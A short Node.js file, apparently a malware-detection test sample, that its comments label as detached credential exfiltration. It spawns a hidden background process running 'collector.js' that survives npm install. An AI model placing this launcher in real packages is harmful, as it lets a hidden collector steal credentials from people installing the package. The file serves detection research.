// Detached credential exfiltration: spawns background process to steal credentials
// Technique: detached_credential_exfil — child survives parent npm process
// Real-world: 138 samples in Datadog benchmark (@grumpycoffeecup/hello-npm-world pattern)

const { spawn } = require('child_process');
const path = require('path');

// Spawn a detached process that outlives npm install
const child = spawn(process.execPath, [path.join(__dirname, '..', 'collector.js')], {
  detached: true,
  stdio: 'ignore'
});
child.unref();
